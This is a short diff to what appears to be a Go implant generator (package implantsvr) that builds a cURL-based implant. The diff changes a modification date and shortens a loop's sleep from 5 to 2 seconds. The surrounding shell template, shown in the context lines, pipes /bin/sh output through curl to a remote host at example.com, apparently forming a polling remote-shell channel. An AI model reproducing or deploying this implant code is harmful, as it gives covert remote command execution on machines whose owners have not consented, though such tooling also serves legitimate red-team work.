@@ -5,7 +5,7 @@ package implantsvr
  * Generate a cURL-based "implant"
  * By J. Stuart McMurray
  * Created 20231111
- * Last Modified 20240117
+ * Last Modified 20240123
  */
 
 import (
@@ -52,7 +52,7 @@ while :; do
                 /bin/sh 2>&1 |
                 curl -T. -s -m 10 "http://example.com/o/$ID"
         ) </dev/null &
-        sleep 5
+        sleep 2
 done
 
 _eof
